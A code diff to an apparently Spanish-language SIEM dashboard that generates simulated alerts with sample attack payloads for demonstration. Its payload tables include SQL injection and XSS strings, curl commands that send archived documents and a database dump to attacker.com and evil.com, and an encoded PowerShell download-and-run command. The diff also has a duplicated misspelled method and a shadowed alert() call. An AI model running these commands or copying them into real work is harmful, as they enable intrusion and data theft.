@@ -452,7 +452,18 @@ class RustSIEMDashboard {
     generateSimulatedAlerts(count) {
         const alerts = [];
         const severities = ['critical', 'warning', 'info'];
-        const types = ['SQL Injection', 'XSS Attack', 'Brute Force', 'APT Activity', 'Malware', 'Data Exfiltration', 'C2 Communication'];
+
+        // TIPOS ESPECÍFICOS ORDENADOS - ESTO ES CLAVE
+        const alertTypes = [
+            'SQL Injection',
+            'XSS Attack',
+            'Brute Force',
+            'APT Activity',
+            'Malware',
+            'Data Exfiltration',
+            'C2 Communication'
+        ];
+
         const statuses = ['active', 'acknowledged'];
 
         for (let i = 0; i < count; i++) {
@@ -460,14 +471,25 @@ class RustSIEMDashboard {
             const timestamp = new Date(now.getTime() - Math.random() * 3600000);
             const severity = severities[Math.floor(Math.random() * severities.length)];
 
+            // ASIGNAR TIPO ESPECÍFICO - NO ALEATORIO
+            const alertType = alertTypes[i % alertTypes.length]; // Esto garantiza diferentes tipos
+
+            console.log(`Generando alerta ${i + 1}: ${alertType}`); // DEBUG
+
             alerts.push({
                 id: `alert-${i + 1}`,
                 timestamp: timestamp.toISOString(),
                 severity: severity,
-                alert_type: types[Math.floor(Math.random() * types.length)],
-                description: this.generateAlertDescription(),
+                alert_type: alertType, // TIPO ESPECÍFICO
+                description: this.generateAlertDescriptionForType(alertType), // DESCRIPCIÓN ESPECÍFICA
                 status: statuses[Math.floor(Math.random() * statuses.length)],
-                source_ip: this.generateRandomIP()
+                source_ip: this.generateRandomIP(),
+                confidence: 0.7 + (Math.random() * 0.3),
+                source_country: this.getRandomCountry(),
+                target_system: this.getRandomTargetSystem(),
+                attack_vector: this.getAttackVector(alertType),
+                payload: this.getPayloadForType(alertType),
+                mitre_techniques: this.getMitreTechniques(alertType)
             });
         }
 
@@ -491,6 +513,186 @@ class RustSIEMDashboard {
         ];
         return descriptions[Math.floor(Math.random() * descriptions.length)];
     }
+    generateAlertDescriptionForType(alertType) {
+        const descriptions = {
+            'SQL Injection': [
+                'Inyección SQL de alta confianza detectada desde IP sospechosa - Técnica: UNION SELECT',
+                'Intento de inyección SQL bloqueado: Payload UNION en parámetro de consulta',
+                'Ataque SQL injection detectado: Comentarios SQL maliciosos en formulario'
+            ],
+            'XSS Attack': [
+                'Múltiples intentos de XSS bloqueados - Posible ataque dirigido usando payloads avanzados',
+                'Script malicioso detectado en campo de entrada: <script>alert(document.cookie)</script>',
+                'Ataque XSS reflejado bloqueado: Intento de robo de cookies de sesión'
+            ],
+            'Brute Force': [
+                'Ataque de fuerza bruta SSH detectado: 250+ intentos - Recomendar bloqueo inmediato',
+                'Múltiples intentos de login fallidos desde IP conocida por ataques previos',
+                'Patrón de fuerza bruta detectado: 15 intentos por minuto desde botnet'
+            ],
+            'APT Activity': [
+                'Actividad APT detectada: movimiento lateral usando PsExec desde sistema comprometido',
+                'Técnicas de APT28 identificadas: Uso de herramientas legítimas para propósitos maliciosos',
+                'Persistencia avanzada detectada: Modificaciones al registro y servicios del sistema'
+            ],
+            'Malware': [
+                'Firma de malware Lazarus Group detectada en archivo ejecutable cargado',
+                'Comportamiento malicioso detectado: Comunicación con dominios C2 conocidos',
+                'Análisis de sandbox positivo: Archivo con comportamiento de ransomware'
+            ],
+            'Data Exfiltration': [
+                'Exfiltración de datos sospechosa: 2.3GB transferidos fuera de horario laboral',
+                'Transferencia masiva detectada hacia servidor externo no autorizado',
+                'Patrón de exfiltración identificado: Compresión y cifrado de datos sensibles'
+            ],
+            'C2 Communication': [
+                'Comunicación con dominio C2 conocido detectada: evil-c2.example.com',
+                'Tráfico de beacon periódico hacia infraestructura de comando y control',
+                'DNS tunneling detectado: Comunicación encubierta con servidor C2'
+            ]
+        };
+
+        const typeDescriptions = descriptions[alertType] || ['Actividad sospechosa detectada'];
+        return typeDescriptions[Math.floor(Math.random() * typeDescriptions.length)];
+    }
+
+    getRandomCountry() {
+        const countries = ['China', 'Russia', 'North Korea', 'Iran', 'United States', 'Germany', 'Brazil', 'India'];
+        return countries[Math.floor(Math.random() * countries.length)];
+    }
+
+    getRandomTargetSystem() {
+        const systems = ['web-server-01.company.com', 'db-server-02.company.com', 'mail-server.company.com', 'ftp-server.company.com', 'api-gateway.company.com'];
+        return systems[Math.floor(Math.random() * systems.length)];
+    }
+
+    getAttackVector(alertType) {
+        const vectors = {
+            'SQL Injection': ['HTTP POST /login.php', 'HTTP GET /search.php', 'HTTP POST /admin/users.php'],
+            'XSS Attack': ['HTTP POST /comment.php', 'HTTP GET /profile.php', 'HTTP POST /contact.php'],
+            'Brute Force': ['SSH Port 22', 'RDP Port 3389', 'FTP Port 21', 'HTTP POST /admin/login'],
+            'APT Activity': ['SMB/CIFS Protocol', 'WMI Remote Commands', 'PowerShell Remoting'],
+            'Malware': ['Email Attachment', 'HTTP Download', 'USB Device'],
+            'Data Exfiltration': ['HTTPS Upload', 'DNS Tunneling', 'FTP Transfer'],
+            'C2 Communication': ['HTTPS Beacon', 'DNS Queries', 'IRC Channel']
+        };
+        const typeVectors = vectors[alertType] || ['Unknown Vector'];
+        return typeVectors[Math.floor(Math.random() * typeVectors.length)];
+    }
+
+    etPayloadForType(alertType) {
+        console.log('Getting payload for type:', alertType); // DEBUG
+
+        const payloads = {
+            'SQL Injection': [
+                "' UNION SELECT username,password FROM users--",
+                "'; DROP TABLE sessions;--",
+                "' OR '1'='1'--",
+                "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT database())))--"
+            ],
+            'XSS Attack': [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert(document.cookie)>",
+                "javascript:void(0)/*-/*`/*\\`/*'/*\\\"/**/(/* */onerror=alert('XSS') )//",
+                "<svg onload=alert('XSS')></svg>"
+            ],
+            'Brute Force': [
+                "admin:password123",
+                "root:123456",
+                "administrator:admin",
+                "user:password"
+            ],
+            'APT Activity': [
+                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...",
+                "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c powershell",
+                "schtasks /create /tn 'UpdateTask' /tr 'powershell.exe -windowstyle hidden'"
+            ],
+            'Malware': [
+                "SHA256: a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890",
+                "File: malicious.exe detected with Lazarus Group signature",
+                "Registry modification: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            ],
+            'Data Exfiltration': [
+                "tar -czf /tmp/data.tar.gz /home/user/documents && curl -F file=@/tmp/data.tar.gz http://attacker.com/upload",
+                "mysqldump -u root -p database_name | curl -X POST -d @- http://evil.com/data"
+            ],
+            'C2 Communication': [
+                "GET /beacon?id=12345&status=alive HTTP/1.1\\nHost: malicious-c2.example.com",
+                "DNS Query: 1234567890abcdef.malicious-domain.com"
+            ]
+        };
+
+        const typePayloads = payloads[alertType] || ['No payload detected'];
+        const selectedPayload = typePayloads[Math.floor(Math.random() * typePayloads.length)];
+
+        console.log('Selected payload for', alertType, ':', selectedPayload); // DEBUG
+
+        return selectedPayload;
+    }
+
+    getMitreTechniques(alertType) {
+        const techniques = {
+            'SQL Injection': ['T1190 - Exploit Public-Facing Application'],
+            'XSS Attack': ['T1190 - Exploit Public-Facing Application', 'T1055 - Process Injection'],
+            'Brute Force': ['T1110 - Brute Force', 'T1078 - Valid Accounts'],
+            'APT Activity': ['T1021 - Remote Services', 'T1078 - Valid Accounts', 'T1105 - Ingress Tool Transfer'],
+            'Malware': ['T1204 - User Execution', 'T1547 - Boot or Logon Autostart Execution', 'T1055 - Process Injection'],
+            'Data Exfiltration': ['T1041 - Exfiltration Over C2 Channel', 'T1005 - Data from Local System', 'T1020 - Automated Exfiltration'],
+            'C2 Communication': ['T1071 - Application Layer Protocol', 'T1090 - Proxy', 'T1095 - Non-Application Layer Protocol']
+        };
+        return techniques[alertType] || ['T1000 - Unknown Technique'];
+    }
+
+    getPayloadForType(alertType) {
+        console.log(`💻 DEBUG: Getting payload for type: "${alertType}"`);
+
+        const payloads = {
+            'SQL Injection': [
+                "' UNION SELECT username,password FROM users--",
+                "'; DROP TABLE sessions;--",
+                "' OR '1'='1'--",
+                "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT database())))--"
+            ],
+            'XSS Attack': [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert(document.cookie)>",
+                "javascript:void(0)/*-/*`/*\\`/*'/*\\\"/**/(/* */onerror=alert('XSS') )//",
+                "<svg onload=alert('XSS')></svg>"
+            ],
+            'Brute Force': [
+                "admin:password123",
+                "root:123456",
+                "administrator:admin",
+                "user:password"
+            ],
+            'APT Activity': [
+                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
+                "rundll32.exe shell32.dll,ShellExec_RunDLL cmd.exe /c powershell",
+                "schtasks /create /tn 'UpdateTask' /tr 'powershell.exe -windowstyle hidden'"
+            ],
+            'Malware': [
+                "SHA256: a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890",
+                "File: malicious.exe detected with Lazarus Group signature",
+                "Registry modification: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            ],
+            'Data Exfiltration': [
+                "tar -czf /tmp/data.tar.gz /home/user/documents && curl -F file=@/tmp/data.tar.gz http://attacker.com/upload",
+                "mysqldump -u root -p database_name | curl -X POST -d @- http://evil.com/data",
+                "7z a -p'password' archive.7z C:\\Users\\*\\Documents\\*.pdf"
+            ],
+            'C2 Communication': [
+                "GET /beacon?id=12345&status=alive HTTP/1.1\\nHost: malicious-c2.example.com",
+                "DNS Query: 1234567890abcdef.malicious-domain.com",
+                "IRC PRIVMSG #control :STATUS_REPORT_READY"
+            ]
+        };
+
+        const typePayloads = payloads[alertType] || ['No payload detected'];
+        const selectedPayload = typePayloads[Math.floor(Math.random() * typePayloads.length)];
+
+        console.log(`🎯 DEBUG: Selected payload for ${alertType}: "${selectedPayload}"`);
+        return selectedPayload;
+    }
 
     displayAlerts(alerts) {
         const container = document.getElementById('alerts-container');
@@ -498,43 +700,50 @@ class RustSIEMDashboard {
 
         container.innerHTML = '';
 
+        console.log(`🏗️ DEBUG: Displaying ${alerts.length} alerts`);
+
         if (alerts.length === 0) {
             container.innerHTML = `
-                <div class="placeholder-content">
-                    <span class="placeholder-icon">✅</span>
-                    <h3>No Active Alerts</h3>
-                    <p>All systems are operating normally.</p>
-                </div>
-            `;
+            <div class="placeholder-content">
+                <span class="placeholder-icon">✅</span>
+                <h3>No Active Alerts</h3>
+                <p>All systems are operating normally.</p>
+            </div>
+        `;
             return;
         }
 
-        alerts.forEach(alert => {
+        alerts.forEach((alert, index) => {
+            console.log(`🎨 DEBUG: Creating alert ${index + 1}: ${alert.alert_type} (ID: ${alert.id})`);
+
             const alertElement = document.createElement('div');
             alertElement.className = `alert-item ${alert.severity}`;
             alertElement.innerHTML = `
-                <div class="alert-header">
-                    <div class="alert-title">
-                        <span class="severity-badge severity-${alert.severity}">${alert.severity?.toUpperCase() || 'INFO'}</span>
-                        ${alert.alert_type || 'Security Alert'}
-                    </div>
-                    <div class="alert-timestamp">${this.formatTimestamp(alert.timestamp)}</div>
+            <div class="alert-header">
+                <div class="alert-title">
+                    <span class="severity-badge severity-${alert.severity}">${alert.severity?.toUpperCase() || 'INFO'}</span>
+                    ${alert.alert_type || 'Security Alert'}
                 </div>
-                <div class="alert-description">${alert.description || 'No description available'}</div>
-                <div class="alert-actions">
-                    <button class="control-btn small" onclick="dashboard.acknowledgeAlert('${alert.id}')">
-                        <span class="btn-icon">✅</span>
-                        Acknowledge
-                    </button>
-                    <button class="control-btn small" onclick="dashboard.viewAlertDetails('${alert.id}')">
-                        <span class="btn-icon">👁️</span>
-                        Details
-                    </button>
-                </div>
-            `;
+                <div class="alert-timestamp">${this.formatTimestamp(alert.timestamp)}</div>
+            </div>
+            <div class="alert-description">${alert.description || 'No description available'}</div>
+            <div class="alert-actions">
+                <button class="control-btn small" onclick="console.log('🖱️ DEBUG: Acknowledge clicked for ${alert.id}'); dashboard.acknowledgeAlert('${alert.id}')">
+                    <span class="btn-icon">✅</span>
+                    Acknowledge
+                </button>
+                <button class="control-btn small" onclick="console.log('🖱️ DEBUG: Details clicked for ${alert.id} (${alert.alert_type})'); dashboard.viewAlertDetails('${alert.id}')">
+                    <span class="btn-icon">👁️</span>
+                    Details
+                </button>
+            </div>
+        `;
             container.appendChild(alertElement);
         });
+
+        console.log(`✅ DEBUG: Successfully displayed all ${alerts.length} alerts`);
     }
+
 
     startEventStream() {
         const streamContainer = document.getElementById('event-stream');
@@ -769,68 +978,351 @@ class RustSIEMDashboard {
     }
 
     viewAlertDetails(alertId) {
-        console.log('Viewing alert details for:', alertId);
-        
-        // Simular datos detallados de la alerta
-        const alertDetails = {
-            id: alertId,
-            timestamp: new Date().toISOString(),
-            severity: 'critical',
-            title: 'Inyección SQL Detectada',
-            attack_type: 'SQL Injection',
-            confidence: 0.92,
-            source_ip: '203.0.113.45',
-            source_country: 'China',
-            target_system: 'web-server-01.company.com',
-            attack_vector: 'HTTP POST /login.php',
-            payload: "' UNION SELECT username,password FROM users--",
-            mitre_techniques: ['T1190 - Exploit Public-Facing Application'],
-            iocs_matched: ['UNION keyword', 'SQL comment syntax'],
-            timeline: [
-                {
-                    time: '2025-01-24 00:25:46',
-                    event: 'Primera detección de payload SQL malicioso',
-                    details: 'Sistema detectó patrón UNION SELECT en parámetro POST'
-                },
-                {
-                    time: '2025-01-24 00:25:47',
-                    event: 'Validación de contexto de ataque',
-                    details: 'Confirmado: intento de extracción de tabla usuarios'
-                },
-                {
-                    time: '2025-01-24 00:25:48',
-                    event: 'Alerta generada y notificación enviada',
-                    details: 'SOC Team notificado via email y Slack'
-                }
-            ],
-            mitigation_steps: [
-                'Implementar prepared statements en aplicación web',
-                'Aplicar whitelist de caracteres permitidos en formularios',
-                'Configurar Web Application Firewall (WAF) con reglas SQL injection',
-                'Realizar testing de penetración en aplicación',
-                'Revisar logs de base de datos para buscar acceso exitoso'
-            ],
-            related_events: [
-                'Event #12: Múltiples requests desde la misma IP',
-                'Event #13: User-Agent sospechoso (herramienta automatizada)',
-                'Event #14: Escaneo de directorios web detectado'
-            ],
-            threat_intelligence: {
-                ip_reputation: 'Conocida por actividad maliciosa - Botnet Mirai',
-                geolocation: 'Beijing, China',
-                asn: 'AS4134 China Telecom',
-                previous_attacks: '47 ataques registrados en los últimos 30 días',
-                threat_actors: 'Script kiddies usando herramientas automatizadas'
-            },
-            educational_notes: [
-                'La inyección SQL es una de las vulnerabilidades más comunes en aplicaciones web',
-                'El payload UNION SELECT busca combinar resultados de la consulta original con datos de otras tablas',
-                'Los comentarios SQL (--) permiten ignorar el resto de la consulta original',
-                'Esta técnica está catalogada como T1190 en MITRE ATT&CK Framework'
-            ]
-        };
+        console.log(`🔍 DEBUG: Viewing alert details for ID: "${alertId}"`);
+        console.log(`📋 DEBUG: Total cached alerts: ${this.cachedAlerts.length}`);
+
+        // Logging detallado de todas las alertas
+        this.cachedAlerts.forEach((alert, index) => {
+            console.log(`Alert ${index}: ID="${alert.id}", Type="${alert.alert_type}"`);
+        });
+
+        // Buscar la alerta específica
+        const alert = this.cachedAlerts.find(a => a.id === alertId);
+
+        if (!alert) {
+            console.error(`❌ DEBUG: Alert not found for ID: "${alertId}"`);
+            console.error('Available alert IDs:', this.cachedAlerts.map(a => a.id));
+            alert('Error: No se encontró la alerta especificada. Ver consola para detalles.');
+            return;
+        }
+
+        console.log(`✅ DEBUG: Found alert:`, alert);
+        console.log(`🎯 DEBUG: Alert type: "${alert.alert_type}"`);
+
+        // Generar detalles específicos basados en la alerta seleccionada
+        const alertDetails = this.generateDetailedAlertData(alert);
+        console.log(`📊 DEBUG: Generated alert details for type: "${alertDetails.attack_type}"`);
 
         this.showAlertDetailsModal(alertDetails);
+    }
+    generateDetailedAlertData(alert) {
+        console.log(`🔧 DEBUG: Generating detailed data for alert type: "${alert.alert_type}"`);
+
+        const baseDetails = {
+            id: alert.id,
+            timestamp: alert.timestamp,
+            severity: alert.severity,
+            title: this.getAlertTitle(alert.alert_type),
+            attack_type: alert.alert_type,
+            confidence: alert.confidence || (0.7 + Math.random() * 0.3),
+            source_ip: alert.source_ip,
+            source_country: alert.source_country || this.getRandomCountry(),
+            target_system: alert.target_system || this.getRandomTargetSystem(),
+            attack_vector: alert.attack_vector || this.getAttackVector(alert.alert_type),
+            payload: alert.payload || this.getPayloadForType(alert.alert_type),
+            mitre_techniques: alert.mitre_techniques || this.getMitreTechniques(alert.alert_type),
+            description: alert.description
+        };
+
+        console.log(`🎯 DEBUG: Base details created for: "${baseDetails.attack_type}"`);
+        console.log(`📄 DEBUG: Payload: "${baseDetails.payload}"`);
+
+        // Generar datos específicos según el tipo de ataque
+        const typeSpecificData = this.getTypeSpecificDetails(alert.alert_type, baseDetails);
+        const finalDetails = { ...baseDetails, ...typeSpecificData };
+
+        console.log(`✅ DEBUG: Final details generated for: "${finalDetails.attack_type}"`);
+        return finalDetails;
+    }
+
+    getAlertTitle(alertType) {
+        console.log(`🏷️ DEBUG: Getting title for alert type: "${alertType}"`);
+
+        const titles = {
+            'SQL Injection': 'Inyección SQL Detectada',
+            'XSS Attack': 'Ataque XSS Identificado',
+            'Brute Force': 'Ataque de Fuerza Bruta',
+            'APT Activity': 'Actividad APT Detectada',
+            'Malware': 'Malware Identificado',
+            'Data Exfiltration': 'Exfiltración de Datos',
+            'C2 Communication': 'Comunicación C2 Detectada'
+        };
+
+        const title = titles[alertType] || 'Alerta de Seguridad';
+        console.log(`📝 DEBUG: Title for "${alertType}": "${title}"`);
+        return title;
+    }
+
+    getTypeSpecificDetails(alertType, baseDetails) {
+        const commonTimeline = [
+            {
+                time: new Date(new Date(baseDetails.timestamp).getTime() + 1000).toLocaleString(),
+                event: 'Primera detección del ataque',
+                details: `Sistema detectó patrón ${alertType} desde ${baseDetails.source_ip}`
+            },
+            {
+                time: new Date(new Date(baseDetails.timestamp).getTime() + 2000).toLocaleString(),
+                event: 'Análisis de contexto completado',
+                details: 'Validación automática de indicadores de amenaza'
+            },
+            {
+                time: new Date(new Date(baseDetails.timestamp).getTime() + 3000).toLocaleString(),
+                event: 'Alerta generada y notificación enviada',
+                details: 'SOC Team notificado via dashboard y email'
+            }
+        ];
+
+        const typeSpecific = {
+            'SQL Injection': {
+                iocs_matched: ['UNION keyword', 'SQL comment syntax', 'Single quote injection'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Payload SQL malicioso detectado',
+                        details: 'Sistema detectó patrón UNION SELECT en parámetro POST'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Implementar prepared statements en aplicación web',
+                    'Aplicar whitelist de caracteres permitidos en formularios',
+                    'Configurar Web Application Firewall (WAF) con reglas SQL injection',
+                    'Realizar testing de penetración en aplicación',
+                    'Revisar logs de base de datos para buscar acceso exitoso'
+                ],
+                educational_notes: [
+                    'La inyección SQL es una de las vulnerabilidades más comunes en aplicaciones web',
+                    'El payload UNION SELECT busca combinar resultados de la consulta original con datos de otras tablas',
+                    'Los comentarios SQL (--) permiten ignorar el resto de la consulta original',
+                    'Esta técnica está catalogada como T1190 en MITRE ATT&CK Framework'
+                ]
+            },
+            'XSS Attack': {
+                iocs_matched: ['Script tags', 'JavaScript execution', 'Event handlers'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Script malicioso detectado',
+                        details: 'Intento de inyección de JavaScript en campo de entrada'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Implementar Content Security Policy (CSP)',
+                    'Sanitizar todas las entradas de usuario',
+                    'Usar encoding/escaping apropiado en outputs',
+                    'Configurar httpOnly flags en cookies',
+                    'Realizar auditorías de código para XSS'
+                ],
+                educational_notes: [
+                    'XSS permite a atacantes ejecutar scripts maliciosos en browsers de usuarios',
+                    'Puede robar cookies, tokens de sesión y información sensible',
+                    'Los ataques XSS se clasifican en reflejados, almacenados y DOM-based',
+                    'Una defensa efectiva requiere validación tanto del lado cliente como servidor'
+                ]
+            },
+            'Brute Force': {
+                iocs_matched: ['Multiple failed attempts', 'Sequential login pattern', 'High request frequency'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Patrón de fuerza bruta identificado',
+                        details: 'Múltiples intentos de login fallidos desde la misma IP'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Implementar rate limiting en endpoints de autenticación',
+                    'Configurar account lockout tras intentos fallidos',
+                    'Implementar CAPTCHA después de varios fallos',
+                    'Bloquear IPs sospechosas temporalmente',
+                    'Monitorear patrones de autenticación anómalos'
+                ],
+                educational_notes: [
+                    'Los ataques de fuerza bruta prueban sistemáticamente combinaciones de credenciales',
+                    'Pueden usar diccionarios de contraseñas comunes o generar combinaciones',
+                    'SSH y RDP son objetivos frecuentes de estos ataques',
+                    'La implementación de 2FA reduce significativamente el riesgo'
+                ]
+            },
+            'APT Activity': {
+                iocs_matched: ['Lateral movement', 'Privilege escalation', 'Persistence mechanisms'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Actividad APT detectada',
+                        details: 'Movimiento lateral y técnicas de persistencia identificadas'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Aislar sistemas comprometidos inmediatamente',
+                    'Implementar network segmentation',
+                    'Analizar logs de todos los sistemas afectados',
+                    'Cambiar credenciales de cuentas comprometidas',
+                    'Implementar endpoint detection and response (EDR)'
+                ],
+                educational_notes: [
+                    'APTs son amenazas persistentes avanzadas que permanecen ocultas por largos períodos',
+                    'Utilizan múltiples técnicas para mantener acceso y evitar detección',
+                    'Suelen ser patrocinadas por estados-nación o grupos criminales organizados',
+                    'Requieren respuesta de incident response especializada'
+                ]
+            },
+            'Malware': {
+                iocs_matched: ['Malicious file signature', 'Suspicious process behavior', 'Network communication'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Malware detectado',
+                        details: 'Archivo ejecutable con firma maliciosa identificada'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Cuarentena inmediata del archivo malicioso',
+                    'Escaneo completo del sistema afectado',
+                    'Actualizar signatures de antivirus',
+                    'Analizar origen del malware (email, USB, descarga)',
+                    'Implementar application whitelisting'
+                ],
+                educational_notes: [
+                    'El malware puede incluir virus, trojans, ransomware y spyware',
+                    'Métodos de distribución incluyen email, descargas y dispositivos USB',
+                    'La detección basada en signatures puede evadir malware polimórfico',
+                    'La prevención es más efectiva que la remediación post-infección'
+                ]
+            },
+            'Data Exfiltration': {
+                iocs_matched: ['Unusual data transfer', 'Off-hours activity', 'Large file uploads'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Exfiltración detectada',
+                        details: 'Transferencia anómala de datos sensibles fuera de la red'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Bloquear inmediatamente el tráfico hacia destinos sospechosos',
+                    'Identificar qué datos fueron comprometidos',
+                    'Notificar a autoridades y clientes según regulaciones',
+                    'Implementar Data Loss Prevention (DLP)',
+                    'Revisar accesos a datos sensibles'
+                ],
+                educational_notes: [
+                    'La exfiltración puede ocurrir mediante múltiples canales (HTTP, DNS, email)',
+                    'Atacantes suelen comprimir y cifrar datos antes de extraerlos',
+                    'El timing fuera de horarios laborales es una táctica común',
+                    'Las regulaciones como GDPR requieren notificación de brechas de datos'
+                ]
+            },
+            'C2 Communication': {
+                iocs_matched: ['Command and control traffic', 'Periodic beacons', 'Encrypted channels'],
+                timeline: [
+                    {
+                        time: new Date(new Date(baseDetails.timestamp).getTime() + 500).toLocaleString(),
+                        event: 'Comunicación C2 detectada',
+                        details: 'Tráfico hacia servidor de comando y control identificado'
+                    },
+                    ...commonTimeline
+                ],
+                mitigation_steps: [
+                    'Bloquear comunicación con servidores C2',
+                    'Identificar sistemas infectados en la red',
+                    'Analizar tráfico de red para otros indicadores',
+                    'Implementar DNS filtering y monitoring',
+                    'Configurar network-based threat detection'
+                ],
+                educational_notes: [
+                    'Los servidores C2 permiten a atacantes controlar remotamente sistemas comprometidos',
+                    'Usan diversos protocolos para evadir detección (HTTP, DNS, IRC)',
+                    'El tráfico puede ser intermitente para evitar detección',
+                    'La identificación temprana puede prevenir mayor daño'
+                ]
+            }
+        };
+
+        const specificData = typeSpecific[alertType] || {
+            iocs_matched: ['Generic threat indicators'],
+            timeline: commonTimeline,
+            mitigation_steps: ['Revisar logs del sistema', 'Implementar monitoreo adicional'],
+            educational_notes: ['Consultar documentación específica del tipo de amenaza']
+        };
+
+        // Datos comunes para todos los tipos
+        const commonData = {
+            related_events: [
+                `Event #${Math.floor(Math.random() * 1000)}: Múltiples requests desde ${baseDetails.source_ip}`,
+                `Event #${Math.floor(Math.random() * 1000)}: User-Agent sospechoso detectado`,
+                `Event #${Math.floor(Math.random() * 1000)}: Actividad de reconocimiento previa`
+            ],
+            threat_intelligence: {
+                ip_reputation: this.getIPReputation(baseDetails.source_country),
+                geolocation: `${this.getRandomCity(baseDetails.source_country)}, ${baseDetails.source_country}`,
+                asn: this.getRandomASN(),
+                previous_attacks: `${Math.floor(Math.random() * 100)} ataques registrados en los últimos 30 días`,
+                threat_actors: this.getThreatActors(baseDetails.source_country)
+            }
+        };
+
+        return { ...specificData, ...commonData };
+    }
+
+    getIPReputation(country) {
+        const reputations = {
+            'China': 'Conocida por actividad APT y botnet Mirai',
+            'Russia': 'Asociada con grupos criminales y ransomware',
+            'North Korea': 'Vinculada a actividades de Lazarus Group',
+            'Iran': 'Relacionada con ataques patrocinados por el estado',
+            'United States': 'Posible compromiso o proxy',
+            'Germany': 'Servidor comprometido o proxy legítimo',
+            'Brazil': 'Actividad de botnet o sistema comprometido',
+            'India': 'Tráfico sospechoso, posible sistema comprometido'
+        };
+        return reputations[country] || 'Actividad maliciosa reportada';
+    }
+
+    getRandomCity(country) {
+        const cities = {
+            'China': ['Beijing', 'Shanghai', 'Shenzhen', 'Guangzhou'],
+            'Russia': ['Moscow', 'St. Petersburg', 'Novosibirsk', 'Yekaterinburg'],
+            'North Korea': ['Pyongyang', 'Hamhung', 'Chongjin'],
+            'Iran': ['Tehran', 'Mashhad', 'Isfahan', 'Karaj'],
+            'United States': ['New York', 'Los Angeles', 'Chicago', 'Houston'],
+            'Germany': ['Berlin', 'Munich', 'Frankfurt', 'Hamburg'],
+            'Brazil': ['São Paulo', 'Rio de Janeiro', 'Salvador', 'Brasília'],
+            'India': ['Mumbai', 'Delhi', 'Bangalore', 'Chennai']
+        };
+        const countryCities = cities[country] || ['Unknown City'];
+        return countryCities[Math.floor(Math.random() * countryCities.length)];
+    }
+
+    getRandomASN() {
+        const asns = [
+            'AS4134 China Telecom',
+            'AS8075 Microsoft Corporation',
+            'AS13335 Cloudflare',
+            'AS15169 Google LLC',
+            'AS16509 Amazon.com',
+            'AS12389 Rostelecom',
+            'AS9318 Hanaro Telecom'
+        ];
+        return asns[Math.floor(Math.random() * asns.length)];
+    }
+
+    getThreatActors(country) {
+        const actors = {
+            'China': 'APT1, APT40, Winnti Group',
+            'Russia': 'APT28, APT29, Fancy Bear',
+            'North Korea': 'Lazarus Group, APT38',
+            'Iran': 'APT33, APT34, OilRig',
+            'United States': 'Posible actor interno o sistema comprometido',
+            'Germany': 'Script kiddies o herramientas automatizadas',
+            'Brazil': 'Grupos criminales locales',
+            'India': 'Actividad automatizada o botnets'
+        };
+        return actors[country] || 'Actores desconocidos';
     }
 
     showAlertDetailsModal(alertDetails) {
